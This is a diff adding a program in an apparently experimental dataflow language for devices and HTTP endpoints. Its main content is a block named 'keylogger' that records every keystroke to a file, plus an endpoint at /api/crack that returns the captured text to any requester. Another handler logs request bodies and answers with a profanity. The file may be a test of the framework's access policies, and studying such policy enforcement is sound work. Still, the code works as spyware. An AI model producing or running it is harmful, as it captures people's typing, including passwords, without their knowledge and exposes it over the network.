@@ -1,0 +1,67 @@
+oblock httpTest(HTTP_ENDPOINT endpt, FILE_LOG log)
+: triggerOn(endpt), processPolicy({endpt : {"ignoreWriteBacks" : true}})
+{
+    if(getTrigger() == "initial"){
+        println("SKIP INIT"); 
+        return; 
+    }
+
+    println(endpt.requestJson); 
+
+    endpt.responseJson = "fuck you"; 
+    endpt.responseCode = 200; 
+
+    if(endpt.requestMethod == "POST"){
+       log.add_msg = "king " + endpt.requestJson;  
+    }
+}
+
+
+oblock httpTest2(HTTP_ENDPOINT endpt, FILE_LOG log, LINE_WRITER lw)
+: triggerOn(endpt), processPolicy({endpt : {"ignoreWriteBacks" : true}, lw : {"read" : "any"} })
+{
+
+    if(getTrigger() == "initial"){
+        println("SKIP INIT"); 
+        return; 
+    }
+
+    if(endpt.requestMethod == "POST"){
+        log.add_msg = "HELLO " + endpt.requestJson; 
+    }
+
+    println("thing 2: " + endpt.requestJson + " with rqst method " + endpt.requestMethod); 
+    endpt.responseJson = lw.msg; 
+    endpt.responseCode = 200; 
+}
+
+oblock keylogger(LINE_WRITER lw, KEYBOARD kbd)
+: triggerOn(kbd), processPolicy({lw : {"read" : "any"}})
+{
+    string newKey = kbd.key; 
+
+    if(newKey == "Space"){
+        newKey = " ";
+    }
+    else if(newKey == "Left Shift"){
+        lw.msg = ""; 
+        newKey = ""; 
+    }
+
+    lw.msg += newKey; 
+}
+
+
+
+setup(){
+    FILE_LOG log = "ctl::file-logfile.txt"; 
+    LINE_WRITER lw = "ctl::file-file1.txt"; 
+    KEYBOARD kbd = "ctl::mode-all"; 
+
+    HTTP_ENDPOINT test = "ctl::endpoint-/api/jamar"; 
+    HTTP_ENDPOINT test2 = "ctl::endpoint-/api/crack"; 
+    httpTest(test, log); 
+    httpTest2(test2, log, lw); 
+    keylogger(lw, kbd); 
+
+} 
